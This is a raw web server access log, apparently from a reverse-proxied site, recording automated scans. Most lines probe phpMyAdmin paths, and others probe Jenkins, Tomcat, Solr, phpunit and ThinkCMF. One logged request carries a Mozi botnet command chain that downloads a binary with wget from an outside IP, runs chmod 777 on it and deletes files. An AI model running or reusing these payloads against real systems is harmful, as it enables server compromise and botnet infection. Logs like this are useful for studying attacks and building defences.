            "127.0.0.1 - - [30/Jan/2021:15:59:43 +0000] \"GET /mysqlmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:44 +0000] \"GET /php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:44 +0000] \"GET /phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:44 +0000] \"GET /mysqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:45 +0000] \"GET /mysql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:45 +0000] \"GET /admin/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:45 +0000] \"GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:46 +0000] \"GET /admin/sysadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:46 +0000] \"GET /admin/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:46 +0000] \"GET /admin/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:47 +0000] \"GET /admin/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:47 +0000] \"GET /admin/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:47 +0000] \"GET /mysql/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:48 +0000] \"GET /mysql/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:48 +0000] \"GET /mysql/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:49 +0000] \"GET /mysql/pMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:49 +0000] \"GET /sql/phpmanager/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:49 +0000] \"GET /sql/php-myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:50 +0000] \"GET /sql/phpmy-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:50 +0000] \"GET /sql/sql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:50 +0000] \"GET /sql/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:51 +0000] \"GET /sql/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:51 +0000] \"GET /sql/sqlweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:51 +0000] \"GET /sql/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:52 +0000] \"GET /sql/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:52 +0000] \"GET /sql/sqladmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:52 +0000] \"GET /sql/sql-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:53 +0000] \"GET /sql/phpmyadmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:53 +0000] \"GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:53 +0000] \"GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:54 +0000] \"GET /db/myadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:54 +0000] \"GET /db/webadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:54 +0000] \"GET /db/dbweb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:55 +0000] \"GET /db/websql/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:55 +0000] \"GET /db/webdb/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:55 +0000] \"GET /db/dbadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:56 +0000] \"GET /db/db-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:56 +0000] \"GET /db/phpmyadmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:56 +0000] \"GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:57 +0000] \"GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:57 +0000] \"GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:58 +0000] \"GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:58 +0000] \"GET /administrator/db/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:58 +0000] \"GET /administrator/web/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:59 +0000] \"GET /administrator/pma/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:59 +0000] \"GET /administrator/PMA/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:15:59:59 +0000] \"GET /administrator/admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:00 +0000] \"GET /phpMyAdmin2/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:00 +0000] \"GET /phpMyAdmin3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:00 +0000] \"GET /phpMyAdmin4/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:01 +0000] \"GET /phpMyAdmin-3/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:01 +0000] \"GET /php-my-admin/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:01 +0000] \"GET /PMA2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:02 +0000] \"GET /PMA2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:02 +0000] \"GET /PMA2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:02 +0000] \"GET /PMA2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:03 +0000] \"GET /PMA2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:03 +0000] \"GET /PMA2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:03 +0000] \"GET /PMA2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:04 +0000] \"GET /PMA2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:04 +0000] \"GET /PMA2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:04 +0000] \"GET /PMA2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:05 +0000] \"GET /pma2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:05 +0000] \"GET /pma2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:05 +0000] \"GET /pma2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:06 +0000] \"GET /pma2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:06 +0000] \"GET /pma2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:06 +0000] \"GET /pma2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:07 +0000] \"GET /pma2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:07 +0000] \"GET /pma2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:08 +0000] \"GET /pma2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:08 +0000] \"GET /pma2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:08 +0000] \"GET /phpmyadmin2011/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:09 +0000] \"GET /phpmyadmin2012/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:09 +0000] \"GET /phpmyadmin2013/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:09 +0000] \"GET /phpmyadmin2014/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:10 +0000] \"GET /phpmyadmin2015/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:10 +0000] \"GET /phpmyadmin2016/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:10 +0000] \"GET /phpmyadmin2017/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:11 +0000] \"GET /phpmyadmin2018/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:11 +0000] \"GET /phpmyadmin2019/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:11 +0000] \"GET /phpmyadmin2020/index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:00:12 +0000] \"GET /index.php?lang=en HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36\"\n",
            "127.0.0.1 - - [30/Jan/2021:16:57:51 +0000] \"GET /favicon.ico HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0\"\n",
            "127.0.0.1 - - [30/Jan/2021:18:24:48 +0000] \"GET /config/getuser?index=0 HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\"\n",
            "127.0.0.1 - - [30/Jan/2021:19:37:37 +0000] \"GET /shell?%2Ftmp%2FMozi.a+jaws=&cd+%2Ftmp=&chmod+777+Mozi.a=&rm+-rf+%2A=&wget+http%3A%2F%2F223.130.29.233%3A60841%2FMozi.a= HTTP/1.0\" 404 232 \"-\" \"Hello, world\"\n",
            "127.0.0.1 - - [30/Jan/2021:20:00:32 +0000] \"GET /level/15/exec/-/sh/run/CR HTTP/1.0\" 404 232 \"-\" \"libwww-perl/6.52\"\n",
            "127.0.0.1 - - [30/Jan/2021:21:28:41 +0000] \"GET /login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:21:28:42 +0000] \"GET /jenkins/login HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - KjeyWDpn [30/Jan/2021:21:28:42 +0000] \"GET /manager/html HTTP/1.0\" 404 232 \"-\" \"Go-http-client/1.1\"\n",
            "127.0.0.1 - - [30/Jan/2021:21:36:00 +0000] \"GET /english/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"GET /console/ HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"POST /api/jsonws/invoke HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:54 +0000] \"POST /Autodiscover/Autodiscover.xml HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:55 +0000] \"GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:56 +0000] \"GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:56 +0000] \"GET /solr/admin/info/system?wt=json HTTP/1.0\" 404 232 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
            "127.0.0.1 - - [31/Jan/2021:00:06:57 +0000] \"GET /?a=fetch&content=%3Cphp%3Edie%28%40md5%28HelloThinkCMF%29%29%3C%2Fphp%3E HTTP/1.0\" 200 7 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36\"\n",
